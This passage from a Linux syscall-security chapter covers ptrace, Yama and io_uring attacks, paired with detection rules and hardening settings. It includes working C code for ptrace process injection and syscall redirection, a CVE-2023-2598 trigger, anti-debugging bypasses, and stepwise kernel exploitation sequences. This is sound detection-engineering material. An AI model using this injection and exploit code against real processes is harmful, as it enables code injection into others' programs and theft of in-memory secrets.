Two credential variants: `PTRACE_MODE_FSCREDS` (check the tracer's filesystem credentials — `fsuid`/`fsgid`) and `PTRACE_MODE_REALCREDS` (check real credentials). `PTRACE_MODE_ATTACH_REALCREDS` is used by `process_vm_readv`/`process_vm_writev`.

Additionally, the LSM hook `security_ptrace_access_check` is called, allowing SELinux, AppArmor, or Yama to impose further restrictions.

### 7.5 Yama LSM

Yama is a stacking LSM (it runs alongside SELinux or AppArmor) that provides additional ptrace restrictions via `/proc/sys/kernel/yama/ptrace_scope`:

**Scope 0 (classic)**: any process can ptrace any other process that passes the standard access checks (same UID, `CAP_SYS_PTRACE`, etc.).

**Scope 1 (restricted, default on Ubuntu and many distributions)**: a process can only ptrace its direct descendants (children, grandchildren), unless the tracee has explicitly declared a tracer via `prctl(PR_SET_PTRACER, tracer_pid)`. This prevents a compromised process from attaching to its siblings or unrelated same-UID processes.

**Scope 2 (admin-only)**: only processes with `CAP_SYS_PTRACE` can ptrace anything. Effectively disables ptrace for unprivileged users.

**Scope 3 (no-attach)**: no process can ptrace any other process, even with `CAP_SYS_PTRACE`. Only `PTRACE_TRACEME` (self-tracing) remains. Debugging requires reboot with a lower scope.

Yama scope 1 is the most common production setting. It substantially limits lateral movement: a compromised web server cannot attach to the SSH agent or the password manager running under the same UID, because they are not its descendants.

### 7.6 Ptrace options

Options are set via `PTRACE_SETOPTIONS` and control what events the tracer receives:

**`PTRACE_O_TRACESECCOMP`**: the tracer receives `PTRACE_EVENT_SECCOMP` events when the tracee's seccomp filter returns `SECCOMP_RET_TRACE`. The tracer can then inspect and modify the syscall.

**`PTRACE_O_TRACEFORK`**, **`PTRACE_O_TRACEVFORK`**, **`PTRACE_O_TRACECLONE`**: the tracer is notified when the tracee `fork`s/`vfork`s/`clone`s, and can automatically attach to the new child. Essential for tracing multi-process programs.

**`PTRACE_O_TRACEEXEC`**: the tracer receives `PTRACE_EVENT_EXEC` when the tracee calls `execve`. The tracer can inspect the new program.

**`PTRACE_O_TRACEEXIT`**: the tracer receives `PTRACE_EVENT_EXIT` when the tracee is about to exit.

**`PTRACE_O_EXITKILL`**: if the tracer exits, the tracee is killed with `SIGKILL`. Prevents orphaned tracees from running unsupervised. Important for sandbox integrity: if the supervisor crashes, the sandboxed process is terminated rather than running unmonitored.

**`PTRACE_O_SUSPEND_SECCOMP`**: allows the tracer to suppress seccomp filtering in the tracee. Requires `CAP_SYS_ADMIN` in the tracer's user namespace. This is used by seccomp-trace-based sandbox emulators that need to perform syscalls on behalf of the tracee without those calls being blocked by the tracee's own filter.

### 7.7 Security implications of ptrace

Ptrace is both a critical debugging infrastructure and a powerful attack primitive:

**Process injection**: `PTRACE_ATTACH` + `PTRACE_POKEDATA` + `PTRACE_SETREGS` allows injecting arbitrary code into a running process. The classic Linux process injection sequence: attach to the target, save its registers, overwrite a code region (or `mmap` a new region via a controlled `syscall` instruction — by setting `RIP` to a `syscall` gadget and registers to the `mmap` arguments), write shellcode into the new region, set `RIP` to the shellcode, detach. Detection: audit `PTRACE_ATTACH` events; monitor `/proc/PID/status` for unexpected `TracerPid` values.

**Credential theft**: attaching to a process and reading its memory can extract secrets (environment variables with API keys, in-memory passwords, private keys, session tokens).

**Anti-debug**: a process can call `PTRACE_TRACEME` on itself, which prevents any other process from attaching (only one tracer per tracee). Malware uses this to resist analysis. Detection: check for the `PTRACE_TRACEME` call in seccomp logs or strace output; check `TracerPid` in `/proc/PID/status`.

### 7.8 Process injection via ptrace — complete implementation

The following C code implements the full ptrace-based process injection sequence used by red team tools and malware for code injection on x86_64. The sequence is: attach, save state, allocate executable memory in the target via a forced `mmap` syscall, write shellcode, redirect execution, detach.

```c
/* ptrace_inject.c — Process injection via ptrace on x86_64
 * Educational and detection-engineering reference.
 * Build: gcc -O2 -o ptrace_inject ptrace_inject.c
 * Usage: ./ptrace_inject <target_pid>
 * Requires: same UID as target, or CAP_SYS_PTRACE, Yama scope 0 or descendant
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>

/* x86_64 shellcode: write "INJECTED\n" to stdout then resume original code.
 * This is benign marker shellcode for demonstration. */
static unsigned char shellcode[] = {
    /* mov rax, 1 (sys_write) */
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
    /* mov rdi, 1 (stdout) */
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
    /* lea rsi, [rip+0x15] (points to string below) */
    0x48, 0x8d, 0x35, 0x15, 0x00, 0x00, 0x00,
    /* mov rdx, 9 (length) */
    0x48, 0xc7, 0xc2, 0x09, 0x00, 0x00, 0x00,
    /* syscall */
    0x0f, 0x05,
    /* int3 (breakpoint — signals back to tracer) */
    0xcc,
    /* "INJECTED\n" */
    0x49, 0x4e, 0x4a, 0x45, 0x43, 0x54, 0x45, 0x44, 0x0a,
};

static long ptrace_poke_bytes(pid_t pid, unsigned long addr,
                              void *data, size_t len)
{
    unsigned long *ptr = (unsigned long *)data;
    size_t i;

    for (i = 0; i < len; i += sizeof(long)) {
        unsigned long word = 0;
        memcpy(&word, (char *)data + i,
               (len - i < sizeof(long)) ? (len - i) : sizeof(long));
        if (ptrace(PTRACE_POKEDATA, pid, addr + i, word) < 0)
            return -1;
    }
    return 0;
}

int main(int argc, char *argv[])
{
    pid_t target;
    struct user_regs_struct saved_regs, inject_regs;
    int status;
    unsigned long mmap_addr;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }
    target = atoi(argv[1]);

    /* Step 1: Attach */
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH");
        return 1;
    }
    waitpid(target, &status, 0);
    printf("[*] Attached to PID %d\n", target);

    /* Step 2: Save registers */
    if (ptrace(PTRACE_GETREGS, target, NULL, &saved_regs) < 0) {
        perror("PTRACE_GETREGS");
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }
    printf("[*] Saved RIP: 0x%llx, RSP: 0x%llx\n",
           saved_regs.rip, saved_regs.rsp);

    /* Step 3: Force mmap syscall in the target to allocate RWX memory.
     * Set registers to: mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
     *                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) */
    inject_regs = saved_regs;
    inject_regs.rax = __NR_mmap;        /* syscall number */
    inject_regs.rdi = 0;                /* addr = NULL */
    inject_regs.rsi = 4096;             /* length */
    inject_regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;  /* prot */
    inject_regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;          /* flags */
    inject_regs.r8  = (unsigned long)-1; /* fd = -1 */
    inject_regs.r9  = 0;                /* offset = 0 */

    /* We need a syscall instruction in the target. Use the current RIP
     * (which is likely at a syscall instruction since the target was
     * stopped by SIGSTOP during a blocking syscall). Alternatively,
     * scan for a 'syscall' gadget (0x0f 0x05) in the target's mapped
     * regions. For simplicity, we set RIP to the target's own syscall
     * instruction. */
    if (ptrace(PTRACE_SETREGS, target, NULL, &inject_regs) < 0) {
        perror("PTRACE_SETREGS (mmap setup)");
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }

    /* Execute the syscall */
    if (ptrace(PTRACE_SINGLESTEP, target, NULL, NULL) < 0) {
        perror("PTRACE_SINGLESTEP");
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }
    waitpid(target, &status, 0);

    /* Read the result (mmap return value in RAX) */
    if (ptrace(PTRACE_GETREGS, target, NULL, &inject_regs) < 0) {
        perror("PTRACE_GETREGS (after mmap)");
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }
    mmap_addr = inject_regs.rax;
    printf("[*] mmap returned: 0x%lx\n", mmap_addr);

    if ((long)mmap_addr < 0) {
        fprintf(stderr, "[-] mmap failed in target (errno %ld)\n",
                -(long)mmap_addr);
        ptrace(PTRACE_SETREGS, target, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }

    /* Step 4: Write shellcode into the allocated region */
    if (ptrace_poke_bytes(target, mmap_addr, shellcode,
                          sizeof(shellcode)) < 0) {
        perror("PTRACE_POKEDATA (shellcode)");
        ptrace(PTRACE_SETREGS, target, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }
    printf("[*] Shellcode written to 0x%lx (%zu bytes)\n",
           mmap_addr, sizeof(shellcode));

    /* Step 5: Redirect execution to the shellcode */
    inject_regs = saved_regs;
    inject_regs.rip = mmap_addr;
    if (ptrace(PTRACE_SETREGS, target, NULL, &inject_regs) < 0) {
        perror("PTRACE_SETREGS (redirect)");
        ptrace(PTRACE_SETREGS, target, NULL, &saved_regs);
        ptrace(PTRACE_DETACH, target, NULL, NULL);
        return 1;
    }

    /* Step 6: Let it run until the INT3 */
    ptrace(PTRACE_CONT, target, NULL, NULL);
    waitpid(target, &status, 0);

    /* Step 7: Restore original registers and detach */
    ptrace(PTRACE_SETREGS, target, NULL, &saved_regs);
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    printf("[*] Detached. Target resumes original execution.\n");

    return 0;
}
```

This code produces the following forensic artifacts: a `PTRACE_ATTACH` event (visible in audit logs and `/proc/PID/status` `TracerPid` field), a new anonymous `rwx` memory mapping in the target's `/proc/PID/maps`, and the shellcode bytes in the target's memory. Detection engineers should monitor for all three.

### 7.9 Anti-debugging techniques and bypass

Malware and CTF challenges use several ptrace-based anti-debugging mechanisms:

**Self-tracing via `PTRACE_TRACEME`.** The process calls `ptrace(PTRACE_TRACEME, 0, 0, 0)` early in execution. Since only one tracer can be attached to a process, this prevents `gdb`, `strace`, or any other tracer from attaching. The bypass is straightforward: patch the `PTRACE_TRACEME` call to a NOP (in the binary or at runtime), or use an LD_PRELOAD library that intercepts `ptrace` and returns success without making the syscall.

**`TracerPid` check.** The process reads `/proc/self/status` and parses the `TracerPid` field. If non-zero, a debugger is attached. Bypass: intercept the `open`/`read` of `/proc/self/status` via LD_PRELOAD or use `gdb`'s `catch syscall` to modify the buffer before the process sees it.

**Timing checks.** The process measures the time between instructions (using `rdtsc`, `clock_gettime`, or the vDSO). Single-stepping or breakpoints introduce measurable delays. Bypass: intercept the timing functions, or use `PTRACE_SYSEMU` to emulate the timing syscalls with forged return values.

**Signal-based detection.** The process installs a `SIGTRAP` handler and executes `int3`. Without a debugger, the handler runs normally. With a debugger attached, the debugger intercepts the `SIGTRAP` first, and the handler may not run (depending on how the debugger forwards signals). Bypass: configure the debugger to forward `SIGTRAP` to the process.

**`prctl(PR_SET_DUMPABLE, 0)`.** Setting the process as non-dumpable prevents `PTRACE_ATTACH` from succeeding (the `ptrace_may_access` check fails because the target's `dumpable` flag is 0). Bypass: requires `CAP_SYS_PTRACE` to override, or patch the `prctl` call.

### 7.10 `PTRACE_SEIZE` vs `PTRACE_ATTACH` — exploitation implications

`PTRACE_SEIZE` (added in Linux 3.4, `PTRACE_SEIZE` = 0x4206) differs from `PTRACE_ATTACH` in several ways that matter for both offensive and defensive operations:

`PTRACE_ATTACH` immediately sends `SIGSTOP` to the tracee, which is visible to the tracee (it appears as a group-stop) and to monitoring tools (the process state transitions to `T` in `/proc/PID/status`). The tracee's signal handlers for `SIGSTOP` do not run (it is a stop signal), but the stop is detectable.

`PTRACE_SEIZE` does not stop the tracee. The tracer must explicitly call `PTRACE_INTERRUPT` to stop it. This makes `PTRACE_SEIZE` stealthier for reconnaissance: the tracer can attach, set options (including `PTRACE_O_TRACESECCOMP` to intercept seccomp events), and wait for the tracee to make an interesting syscall — all without ever stopping the tracee or altering its behavior. From a detection perspective, `PTRACE_SEIZE` still updates the tracee's `TracerPid` in `/proc/PID/status`, so monitoring that field catches both attach methods.

Another difference: `PTRACE_SEIZE` delivers `PTRACE_EVENT_STOP` events instead of `SIGSTOP`-based group stops, which gives the tracer cleaner signal semantics (it can distinguish between group stops and ptrace stops). For exploit development, `PTRACE_SEIZE` combined with `PTRACE_O_TRACESECCOMP` is the preferred method for intercepting a target process's seccomp-filtered syscalls without disrupting its execution flow.

### 7.11 ptrace detection

**Auditd rules for ptrace monitoring.**

```bash
# /etc/audit/rules.d/ptrace.rules
# Log all ptrace calls
-a always,exit -F arch=b64 -S ptrace -k ptrace_call

# Log ptrace with specific requests (ATTACH=16, SEIZE=0x4206)
-a always,exit -F arch=b64 -S ptrace -F a0=16 -k ptrace_attach
-a always,exit -F arch=b64 -S ptrace -F a0=0x4206 -k ptrace_seize
```

**Sigma rule for ptrace-based injection.**

```yaml
title: ptrace process injection attempt
id: b2c3d4e5-f6a7-8901-bcde-f23456789012
status: experimental
description: Detects ptrace ATTACH/SEIZE calls from non-debugger processes
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: ptrace
        a0:
            - 16     # PTRACE_ATTACH
            - 16902   # PTRACE_SEIZE (0x4206)
    filter_debuggers:
        exe:
            - /usr/bin/gdb
            - /usr/bin/strace
            - /usr/bin/ltrace
            - /usr/bin/lldb
    condition: selection and not filter_debuggers
level: high
tags:
    - attack.privilege_escalation
    - attack.t1055.008
```

**Sysmon for Linux.** Microsoft's Sysmon for Linux (SysmonForLinux) generates `ProcessAccess` events (Event ID 10) when ptrace is used. The `SourceProcessGuid` and `TargetProcessGuid` fields identify the tracer and tracee. Detection rules should alert on `GrantedAccess` values that include `PROCESS_VM_READ` or `PROCESS_VM_WRITE` from unexpected source processes.

**Runtime monitoring.** Periodically scan `/proc/*/status` for non-zero `TracerPid` values. Any process with an unexpected tracer attached is a potential indicator of compromise. The following one-liner identifies traced processes:

```bash
grep -l 'TracerPid:\s[1-9]' /proc/[0-9]*/status 2>/dev/null | \
    while read f; do
        pid=$(echo "$f" | cut -d/ -f3)
        tracer=$(awk '/TracerPid/{print $2}' "$f")
        name=$(awk '/Name/{print $2}' "$f")
        echo "PID $pid ($name) traced by PID $tracer"
    done
```

---

## 8. Syscall-level attack artifacts and detection engineering

This section consolidates detection engineering across all syscall-level attack surfaces covered in this chapter. The goal is to provide detection engineers with a structured mapping from attack type to telemetry source to detection method, followed by comprehensive hardening guidance.

### 8.1 Artifacts table

| Attack Type | Primary Syscall(s) | Telemetry Source | Key Artifact | Detection Method |
|---|---|---|---|---|
| Syscall table hooking | (kernel module load) | `init_module`/`finit_module` audit | Modified `sys_call_table` entries | Compare runtime table vs `System.map`; Volatility `linux_check_syscall` |
| Seccomp bypass via io_uring | `io_uring_setup` | auditd, eBPF tracepoint | `io_uring_setup` from sandboxed process | Sigma rule on `io_uring_setup` in container context |
| Seccomp bypass via arch switch | `int 0x80` from 64-bit process | seccomp audit log (`type=SECCOMP`) | `arch=40000003` in a 64-bit context | Filter on `arch` mismatch in audit events |
| userfaultfd exploitation | `userfaultfd` (NR 323) | auditd, eBPF | Unprivileged `userfaultfd` creation | Alert on NR 323 from non-root, non-`CAP_SYS_PTRACE` |
| ptrace injection | `ptrace` (ATTACH/SEIZE/POKEDATA) | auditd, Sysmon, `/proc/PID/status` | Non-zero `TracerPid`; new RWX mappings | Sigma rule on ptrace from non-debugger; scan `/proc/*/maps` for `rwxp` |
| Cross-process memory read | `process_vm_readv` (NR 310) | auditd | Cross-process memory access | Alert on NR 310 from unexpected processes |
| io_uring UAF | `io_uring_enter` with racing operations | kernel crash/panic logs, KASAN | KASAN report with `io_uring` in stack trace | Monitor `dmesg` for KASAN/KFENCE reports |

### 8.2 Comprehensive sysctl hardening

The following `sysctl` settings reduce the syscall-level attack surface. Apply via `/etc/sysctl.d/99-syscall-hardening.conf`:

```bash
# === userfaultfd ===
# Restrict to CAP_SYS_PTRACE (eliminates unprivileged TOCTOU primitive)
vm.unprivileged_userfaultfd = 0

# === io_uring ===
# Disable for unprivileged users (Linux 6.0+)
# 0 = enabled, 1 = disabled for unprivileged, 2 = disabled entirely
io_uring_disabled = 1

# === ptrace ===
# Yama scope 1 (restrict to descendants) — minimum for production
# Scope 2 (admin-only) or 3 (no-attach) for hardened environments
kernel.yama.ptrace_scope = 1

# === BPF ===
# Restrict unprivileged BPF (prevents eBPF-based reconnaissance)
kernel.unprivileged_bpf_disabled = 1

# === Performance events ===
# Restrict perf_event_open (prevents side-channel attacks via PMCs)
kernel.perf_event_paranoid = 3

# === Kernel pointers ===
# Hide kernel pointers from unprivileged users (breaks KASLR leak)
kernel.kptr_restrict = 2

# === dmesg ===
# Restrict dmesg to root (prevents kernel info leak)
kernel.dmesg_restrict = 1

# === Core dumps ===
# Disable core dumps (prevents credential leak via core files)
fs.suid_dumpable = 0

# === Kexec ===
# Disable kexec (prevents kernel replacement attacks)
kernel.kexec_load_disabled = 1
```

### 8.3 eBPF-based runtime monitoring

The following eBPF program provides comprehensive syscall-level monitoring. It tracks the high-risk syscalls discussed throughout this chapter (`ptrace`, `userfaultfd`, `io_uring_setup`, `process_vm_readv`, `process_vm_writev`) and emits structured events to a ring buffer for user-space consumption:

```c
/* syscall_monitor.bpf.c — Comprehensive syscall security monitor
 * Compile: clang -O2 -target bpf -c syscall_monitor.bpf.c -o syscall_monitor.bpf.o
 * Attach to: raw_tracepoint/sys_enter
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

/* x86_64 syscall numbers for monitored calls */
#define NR_PTRACE           101
#define NR_PROCESS_VM_READV 310
#define NR_PROCESS_VM_WRITEV 311
#define NR_USERFAULTFD      323
#define NR_IO_URING_SETUP   425
#define NR_IO_URING_ENTER   426

#define EVENT_PTRACE         1
#define EVENT_VM_READV       2
#define EVENT_VM_WRITEV      3
#define EVENT_USERFAULTFD    4
#define EVENT_IO_URING_SETUP 5
#define EVENT_IO_URING_ENTER 6

#define COMM_LEN 16

struct alert_event {
    u64 timestamp;
    u32 pid;
    u32 uid;
    u32 event_type;
    u64 syscall_nr;
    u64 arg0;
    u64 arg1;
    char comm[COMM_LEN];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 512 * 1024);
} alerts SEC(".maps");

static __always_inline void emit_alert(u32 event_type, u64 nr,
                                        struct pt_regs *regs)
{
    struct alert_event *e;

    e = bpf_ringbuf_reserve(&alerts, sizeof(*e), 0);
    if (!e)
        return;

    e->timestamp  = bpf_ktime_get_ns();
    e->pid        = bpf_get_current_pid_tgid() >> 32;
    e->uid        = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    e->event_type = event_type;
    e->syscall_nr = nr;
    bpf_probe_read_kernel(&e->arg0, sizeof(e->arg0), &regs->di);
    bpf_probe_read_kernel(&e->arg1, sizeof(e->arg1), &regs->si);
    bpf_get_current_comm(e->comm, sizeof(e->comm));

    bpf_ringbuf_submit(e, 0);
}

SEC("raw_tracepoint/sys_enter")
int monitor_syscalls(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long nr = ctx->args[1];
    struct pt_regs *regs = (struct pt_regs *)ctx->args[0];

    switch (nr) {
    case NR_PTRACE:
        emit_alert(EVENT_PTRACE, nr, regs);
        break;
    case NR_PROCESS_VM_READV:
        emit_alert(EVENT_VM_READV, nr, regs);
        break;
    case NR_PROCESS_VM_WRITEV:
        emit_alert(EVENT_VM_WRITEV, nr, regs);
        break;
    case NR_USERFAULTFD:
        emit_alert(EVENT_USERFAULTFD, nr, regs);
        break;
    case NR_IO_URING_SETUP:
        emit_alert(EVENT_IO_URING_SETUP, nr, regs);
        break;
    case NR_IO_URING_ENTER:
        emit_alert(EVENT_IO_URING_ENTER, nr, regs);
        break;
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

This program fires on every syscall entry but performs a fast switch on the syscall number, emitting events only for the monitored set. The user-space consumer (typically a Go or Rust daemon using `libbpf-rs` or `cilium/ebpf`) reads from the ring buffer and forwards events to the SIEM pipeline. In production deployments (Falco, Tracee, Tetragon), this pattern is extended with container-context enrichment (reading cgroup ID, namespace ID, and container runtime metadata) and configurable policy rules.

---

## 9. Advanced Syscall Exploitation Techniques

### 9.1 TOCTOU races in syscall arguments

Syscall arguments that are pointers (filenames, ioctl structures, sockaddr buffers) are copied from user space by `copy_from_user()` inside the kernel handler. A classic double-fetch vulnerability arises when the kernel reads the same user-space memory twice — once to validate, once to use — and an attacker modifies the memory between reads. This is a time-of-check-to-time-of-use (TOCTOU) race.

**Double-fetch pattern.** The vulnerable pattern in kernel code looks like:

```c
/* VULNERABLE — double fetch from user space */
if (copy_from_user(&header, uptr, sizeof(header)))
    return -EFAULT;

if (header.length > MAX_LEN)      /* CHECK */
    return -EINVAL;

/* ... context switch or preemption window ... */

if (copy_from_user(kbuf, uptr, header.length))  /* USE — re-reads header.length */
    return -EFAULT;
```

Between the check and the second `copy_from_user`, another thread sharing the same address space can overwrite `header.length` at `uptr` to a value exceeding `MAX_LEN`, causing a kernel heap overflow.

**Exploitation with userfaultfd.** The `userfaultfd` mechanism (§5) provides deterministic control over this race. The attacker:

1. Maps two adjacent pages. Page A contains the legitimate header; page B is registered with `userfaultfd`.
2. The pointer argument to the syscall is positioned so the header spans the page boundary — the `length` field lies on page B.
3. On the first `copy_from_user`, the kernel reads page A (cached) and faults on page B. The `userfaultfd` handler supplies a page with a valid `length` value. The check passes.
4. The attacker's `userfaultfd` handler unmaps page B and re-registers it. On the second `copy_from_user`, the fault fires again. This time the handler supplies a page with `length` set to a large value.
5. The kernel uses the large `length` for the copy, overflowing the kernel buffer.

This technique converts a statistical race into a deterministic exploit. The kernel mitigations (`vm.unprivileged_userfaultfd = 0` since Linux 5.2, and the progressive restriction of `userfaultfd` to `CAP_SYS_PTRACE`) exist precisely to eliminate this primitive from the unprivileged attack surface.

**Detecting double-fetch exploitation.** Monitor for the combination: `userfaultfd` creation (NR 323) followed by a high-value syscall (e.g., `ioctl` on a device fd, `sendmsg` with large ancillary data). Auditd can correlate these within a process timeline. The Tetragon policy in §10.3 below provides an eBPF-based approach.

### 9.2 io_uring exploitation deep dive — registered buffer abuse

The generic io_uring UAF via timeout racing is covered in §4.4–4.5. This subsection addresses two distinct vulnerability classes in io_uring's registered buffer machinery.

**CVE-2023-2598 — Registered buffer out-of-bounds access.** The `io_uring` subsystem allows pre-registering user buffers via `IORING_REGISTER_BUFFERS` (`io_uring_register` with opcode 0). When a buffer is registered, the kernel pins its pages and stores the page array and metadata in `struct io_mapped_ubuf`. Submission queue entries (SQEs) referencing registered buffers via `IOSQE_BUFFER_SELECT` or fixed-buffer opcodes bypass the normal `import_iovec`/`copy_from_user` path and instead use the pre-pinned pages directly.

In kernels 5.7 through 6.3, the bounds validation for registered buffer access was insufficient. The `io_import_fixed` function calculated the buffer offset and length from the SQE fields but failed to properly validate that `sqe->addr` (the offset within the registered buffer) plus `sqe->len` did not exceed the registered buffer's actual size. An attacker could submit an SQE with an offset/length pair that extended past the registered buffer boundaries, achieving a kernel-space out-of-bounds read or write on the physically contiguous pages adjacent to the registered buffer.

Exploitation sequence:

1. Register a buffer of size N via `IORING_REGISTER_BUFFERS`.
2. Submit an `IORING_OP_READ_FIXED` or `IORING_OP_WRITE_FIXED` SQE targeting the registered buffer with `sqe->off` + `sqe->len` > N.
3. The kernel reads/writes beyond the buffer boundary, accessing adjacent kernel memory (the pages following the pinned user pages in the kernel's direct map).
4. By spraying target objects (e.g., `struct cred`, pipe buffers) into the adjacent slab/page allocations, the attacker achieves controlled read/write over kernel objects.

```c
/* CVE-2023-2598 trigger — registered buffer OOB
 * Demonstrates the bounds check bypass on vulnerable kernels (5.7–6.3).
 * Build: gcc -O2 -o cve_2023_2598 cve_2023_2598.c -luring
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <liburing.h>
#include <sys/mman.h>

#define BUF_SIZE 4096
#define OOB_READ_LEN (BUF_SIZE + 4096)  /* read 1 page beyond */

int main(void)
{
    struct io_uring ring;
    struct iovec iov;
    char *buf;
    int ret;

    buf = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { perror("mmap"); return 1; }
    memset(buf, 'A', BUF_SIZE);

    ret = io_uring_queue_init(8, &ring, 0);
    if (ret < 0) { fprintf(stderr, "queue_init: %s\n", strerror(-ret)); return 1; }

    /* Register the buffer */
    iov.iov_base = buf;
    iov.iov_len  = BUF_SIZE;
    ret = io_uring_register_buffers(&ring, &iov, 1);
    if (ret < 0) { fprintf(stderr, "register: %s\n", strerror(-ret)); return 1; }

    /* Submit OOB read via fixed buffer — on patched kernels this returns -EFAULT */
    int pipefd[2];
    pipe(pipefd);

    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read_fixed(sqe, pipefd[0], buf, OOB_READ_LEN, 0, 0);
    /* sqe->len = OOB_READ_LEN exceeds registered iov_len = BUF_SIZE */

    io_uring_submit(&ring);

    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(&ring, &cqe);
    printf("CQE result: %d (negative = blocked by bounds check)\n", cqe->res);
    io_uring_cqe_seen(&ring, cqe);

    io_uring_queue_exit(&ring);
    munmap(buf, BUF_SIZE);
    return 0;
}
```

The fix (committed to 6.4 and backported) adds strict validation in `io_import_fixed` ensuring `buf_addr + sqe->len <= imu->ubuf_end`.

**CVE-2024-0582 — PBUF_RING page reference use-after-free.** Linux 6.4 introduced provided buffer rings (`IORING_OP_PROVIDE_BUFFERS` / `IOU_PBUF_RING`) allowing user space to supply a ring of buffers that io_uring consumes for incoming data (e.g., `recv`). The kernel takes page references on the buffer ring pages via `get_user_pages_fast`. The vulnerability: when the buffer ring was unregistered (`IORING_UNREGISTER_PBUF_RING`), the kernel released the page references but did not ensure all in-flight SQEs referencing those pages had completed. A racing completion could write to a page whose reference count had dropped to zero, meaning the page could have been returned to the page allocator and reallocated for another purpose.

Exploitation: the attacker registers a PBUF_RING, submits `IORING_OP_RECV` SQEs that will consume buffers from the ring, then races `IORING_UNREGISTER_PBUF_RING` against the completions. The freed pages are reclaimed by spraying (e.g., `fork` to allocate page tables, `sendmsg` for `sk_buff` data pages). The in-flight completion writes attacker-controlled network data into the reclaimed page, which is now a page table or credential structure. Affected kernels: 6.4 through 6.7. The fix serializes unregistration against in-flight completions using `io_uring`'s quiesce mechanism.

### 9.3 ptrace-based syscall redirection

The full PTRACE_POKETEXT code injection sequence is in §7.8. A subtler technique avoids writing any code into the target — instead, the tracer hijacks individual syscalls by rewriting the target's registers at the syscall entry/exit boundary.

**Technique: forced arbitrary syscalls via PTRACE_SYSCALL.** When a tracer attaches with `PTRACE_SYSCALL`, the tracee stops at every syscall entry and exit. At the entry stop, the tracer can:

1. Read the tracee's registers (`PTRACE_GETREGS`).
2. Overwrite `orig_rax` to change the syscall number.
3. Overwrite `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9` to change arguments.
4. Continue the tracee (`PTRACE_SYSCALL`).

The kernel dispatches the modified syscall. At the exit stop, the tracer reads `rax` for the return value. This allows forcing the target to execute arbitrary syscalls (e.g., `mmap`, `open`, `connect`, `execve`) without injecting any code.

```c
/* ptrace_syscall_redirect.c — Force a target process to execute mmap
 * via register manipulation at a PTRACE_SYSCALL stop.
 * Build: gcc -O2 -o redirect ptrace_syscall_redirect.c
 * Usage: ./redirect <target_pid>
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <errno.h>

int main(int argc, char **argv)
{
    pid_t pid = atoi(argv[1]);
    struct user_regs_struct regs, saved_regs;
    int status;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH"); return 1;
    }
    waitpid(pid, &status, 0);

    /* Wait for the next syscall entry */
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    /* Save original registers */
    ptrace(PTRACE_GETREGS, pid, NULL, &saved_regs);
    regs = saved_regs;

    /* Redirect to mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
     *                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) */
    regs.orig_rax = SYS_mmap;
    regs.rdi = 0;                                          /* addr */
    regs.rsi = 4096;                                       /* length */
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;        /* prot */
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;                /* flags */
    regs.r8  = (unsigned long)-1;                          /* fd */
    regs.r9  = 0;                                          /* offset */

    ptrace(PTRACE_SETREGS, pid, NULL, &regs);

    /* Let the syscall execute, stop at exit */
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    waitpid(pid, &status, 0);

    /* Read the return value — the mmap'd address in the target */
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("mmap returned: 0x%llx in target pid %d\n", regs.rax, pid);

    /* Restore original registers and detach */
    ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}
```

**Detection.** The key indicator is a process stopping at every syscall boundary (visible as frequent `PTRACE_SYSCALL` calls from the tracer). Auditd captures the `ptrace` syscall with `a0=24` (PTRACE_SYSCALL = 24). Correlate with `PTRACE_SETREGS` (`a0=13`) calls from the same tracer PID. A tracer that issues `PTRACE_GETREGS` + `PTRACE_SETREGS` in rapid alternation on a non-child process is highly indicative of syscall redirection.

### 9.4 Seccomp filter bypass via io_uring

